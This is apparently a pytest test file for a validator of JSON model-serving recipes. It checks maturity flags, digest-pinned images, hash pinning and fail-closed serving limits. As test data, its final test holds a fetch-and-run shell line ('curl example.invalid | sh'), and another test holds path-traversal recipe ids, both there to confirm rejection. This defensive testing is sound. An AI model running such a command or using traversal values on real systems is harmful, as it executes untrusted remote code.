from __future__ import annotations

import copy
import importlib.util
import json
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[1]
MODULE_PATH = ROOT / "scripts" / "sparkring_recipe.py"
SPEC = importlib.util.spec_from_file_location("sparkring_recipe", MODULE_PATH)
assert SPEC is not None and SPEC.loader is not None
recipe_module = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(recipe_module)


def _recipe() -> dict:
    return json.loads(
        (ROOT / "recipes" / "glm52-nf3-hybrid.json").read_text(encoding="utf-8")
    )


def _exl3_recipe() -> dict:
    return json.loads(
        (ROOT / "recipes" / "glm52-exl3-tr3-3.25bpw.json").read_text(
            encoding="utf-8"
        )
    )


def test_nf3_recipe_is_valid_default_and_local_build_ready():
    recipe = _recipe()
    recipe_module._validate(recipe)
    assert recipe["recipe_id"] == "glm52-nf3-hybrid"
    assert recipe["maturity"] == "public-clean-checkout-live-validated"
    assert recipe["runtime"]["final_image"] is None
    assert recipe["publication"]["zero_build_ready"] is False
    assert recipe["publication"]["local_build_ready"] is True
    assert recipe["serving"]["default_kv_profile"] == "fp8"
    assert recipe["serving"]["kv_profiles"]["nvfp4-rope8"][
        "reported_kv_tokens"
    ] == 875520
    assert recipe["serving"]["kv_profiles"]["nvfp4-rope8"][
        "public_bootstrap_live_validated"
    ] is True


def test_recipe_cannot_regress_clean_checkout_live_maturity():
    recipe = _recipe()
    recipe["maturity"] = "public-source-bootstrap-ready"
    with pytest.raises(recipe_module.RecipeError, match="accepted public live gate"):
        recipe_module._validate(recipe)


def test_plan_is_offline_deterministic_and_names_bootstrap(capsys):
    recipe, path = recipe_module._load("glm52-nf3-hybrid")
    first = recipe_module._canonical_digest(recipe)
    second = recipe_module._canonical_digest(
        json.loads(json.dumps(recipe, sort_keys=False))
    )
    assert first == second
    assert recipe_module._plan(recipe, path, False) == 0
    output = capsys.readouterr().out
    assert "built locally from pinned public inputs" in output
    assert "bootstrap_nf3.py" in output


def test_zero_build_cannot_be_claimed_without_final_image():
    recipe = _recipe()
    recipe["publication"]["zero_build_ready"] = True
    with pytest.raises(recipe_module.RecipeError, match="without final_image"):
        recipe_module._validate(recipe)


def test_final_image_must_be_digest_pinned():
    recipe = _recipe()
    recipe["runtime"]["final_image"] = "ghcr.io/fujitsupolycom/sparkring-nf3:latest"
    with pytest.raises(recipe_module.RecipeError, match="immutable OCI digest"):
        recipe_module._validate(recipe)


def test_mtp_inputscales_are_identity_pinned():
    recipe = _recipe()
    recipe["model"]["mtp_draft"]["inputscales_sha256"] = "not-a-hash"
    with pytest.raises(
        recipe_module.RecipeError,
        match=r"model\.mtp_draft\.inputscales_sha256",
    ):
        recipe_module._validate(recipe)


def test_aiden_cannot_become_a_second_public_recipe():
    recipe = copy.deepcopy(_recipe())
    recipe["recipe_id"] = "glm52-mxfp4-gptq"
    with pytest.raises(recipe_module.RecipeError, match="unsupported recipe id"):
        recipe_module._validate(recipe)


def test_exl3_recipe_records_exact_live_contract_without_overclaiming():
    recipe = _exl3_recipe()
    recipe_module._validate(recipe)
    assert recipe["recipe_id"] == "glm52-exl3-tr3-3.25bpw"
    assert recipe["maturity"] == "live-validated"
    assert recipe["default"] is False
    assert recipe["publication"]["zero_build_ready"] is False
    assert recipe["publication"]["local_build_ready"] is False
    assert recipe["serving"]["mtp_policy"] == "fixed-3"
    assert recipe["serving"]["max_model_len"] == 1048576
    assert recipe["serving"]["kv_cache_bytes_per_rank"] == 9000000000
    assert recipe["serving"]["reported_kv_tokens"] == 1125632
    assert recipe["serving"]["max_num_seqs"] == 8
    assert recipe["serving"]["max_query_rows"] == 32


def test_exl3_plan_is_offline_and_reports_publication_blocker(capsys):
    recipe, path = recipe_module._load("glm52-exl3-tr3-3.25bpw")
    assert recipe_module._plan(recipe, path, False) == 0
    output = capsys.readouterr().out
    assert "no public reproducible image yet" in output
    assert "Publish and receipt-gate" in output
    assert "bootstrap_nf3.py" not in output


def test_exl3_cannot_claim_public_build_readiness_without_builder():
    recipe = _exl3_recipe()
    recipe["publication"]["local_build_ready"] = True
    with pytest.raises(recipe_module.RecipeError, match="cannot claim"):
        recipe_module._validate(recipe)


def test_exl3_q32_c8_contract_is_fail_closed():
    for field, value in (
        ("max_num_seqs", 16),
        ("max_query_rows", 40),
        ("mtp_policy", "adaptive-2-3-window32"),
        ("kv_cache_bytes_per_rank", 7000000000),
    ):
        recipe = _exl3_recipe()
        recipe["serving"][field] = value
        with pytest.raises(recipe_module.RecipeError, match=f"serving.{field}"):
            recipe_module._validate(recipe)


@pytest.mark.parametrize("recipe_id", ("../escape", "a..b", ".hidden", "a/b"))
def test_recipe_id_with_path_or_empty_segments_is_rejected(recipe_id):
    with pytest.raises(recipe_module.RecipeError, match="invalid recipe id"):
        recipe_module._load(recipe_id)


def test_nf3_remains_the_only_default_recipe():
    recipes = [
        recipe_module._load(path.stem)[0]
        for path in sorted((ROOT / "recipes").glob("*.json"))
    ]
    assert [recipe["recipe_id"] for recipe in recipes if recipe["default"]] == [
        "glm52-nf3-hybrid"
    ]


def test_required_nf3_safety_controls_are_fail_closed():
    for field, value in (
        ("workspace_reserve_bytes", 0),
        ("startup_profile_max_tokens", 4096),
        ("max_num_seqs", 16),
        ("mtp_policy", "fixed-4"),
    ):
        recipe = _recipe()
        recipe["serving"][field] = value
        with pytest.raises(recipe_module.RecipeError, match=f"serving.{field}"):
            recipe_module._validate(recipe)


def test_unknown_top_level_field_is_rejected(tmp_path, monkeypatch):
    recipe = _recipe()
    recipe["shell_command"] = "curl example.invalid | sh"
    recipes = tmp_path / "recipes"
    recipes.mkdir()
    (recipes / "glm52-nf3-hybrid.json").write_text(
        json.dumps(recipe), encoding="utf-8"
    )
    monkeypatch.setattr(recipe_module, "RECIPES", recipes)
    with pytest.raises(recipe_module.RecipeError, match="unknown recipe fields"):
        recipe_module._load("glm52-nf3-hybrid")
